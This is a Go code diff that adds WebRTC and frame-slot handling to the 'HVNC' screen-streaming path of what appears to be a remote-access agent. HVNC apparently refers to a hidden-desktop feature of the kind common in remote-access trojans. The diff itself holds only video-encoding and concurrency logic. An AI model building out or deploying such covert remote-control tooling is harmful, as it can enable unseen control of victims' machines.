@@ -614,6 +614,14 @@ func ResetPrev() {
 	resetH264Encoder()
 }
 
+func ResetPrevHVNC() {
+	hvncPrevMu.Lock()
+	hvncPrevFrame = nil
+	hvncPrevMu.Unlock()
+	hvncLastKeyframe.Store(0)
+	resetH264EncoderHVNC()
+}
+
 func jpegQuality() int {
 
 	if q := overrideQuality.Load(); q > 0 {
@@ -1550,12 +1558,14 @@ func SetQualityAndCodec(quality int, codec string) {
 		h264WarnOnce = sync.Once{}
 		if s != "h264" {
 			resetH264Encoder()
+			resetH264EncoderHVNC()
 		}
 	case "":
 
 	default:
 		overrideCodec.Store("jpeg")
 		resetH264Encoder()
+		resetH264EncoderHVNC()
 	}
 }
 
@@ -1599,9 +1609,19 @@ func captureAndSendHVNC(ctx context.Context, env *rt.Env) error {
 	}
 	captureDur := time.Since(t0)
 
+	willSendViaWebRTC := blockCodec() == "h264" && webrtcpub.IsActive(webrtcpub.KindHVNC)
+	var slotAcquired bool
+	if !willSendViaWebRTC && !AcquireFrameSlot() {
+		return nil
+	}
+	slotAcquired = !willSendViaWebRTC
+
 	quality := jpegQuality()
 	frame, encodeDur, err := buildFrameHVNC(img, display, quality)
 	if err != nil {
+		if slotAcquired {
+			ReleaseFrameSlot()
+		}
 		return err
 	}
 
@@ -1613,12 +1633,37 @@ func captureAndSendHVNC(ctx context.Context, env *rt.Env) error {
 	frame.Header.FPS = fps
 
 	if ctx.Err() != nil {
+		if slotAcquired {
+			ReleaseFrameSlot()
+		}
 		return nil
+	}
+	if frame.Header.Format == "h264" && webrtcpub.IsActive(webrtcpub.KindHVNC) {
+		dur := time.Second / time.Duration(fps)
+		if dur <= 0 {
+			dur = 33 * time.Millisecond
+		}
+		if werr := webrtcpub.WriteH264(webrtcpub.KindHVNC, frame.Data, dur); werr != nil {
+			log.Printf("webrtc: write hvnc h264 failed: %v", werr)
+		}
+		if slotAcquired {
+			ReleaseFrameSlot()
+		}
+		return nil
+	}
+	if !slotAcquired {
+		if !AcquireFrameSlot() {
+			return nil
+		}
+		slotAcquired = true
 	}
 
 	sendStart := time.Now()
 	err = wire.WriteMsg(ctx, env.Conn, frame)
 	sendDur := time.Since(sendStart)
+	if err != nil {
+		ReleaseFrameSlot()
+	}
 
 	if shouldLogFrame(now) {
 		total := time.Since(t0)
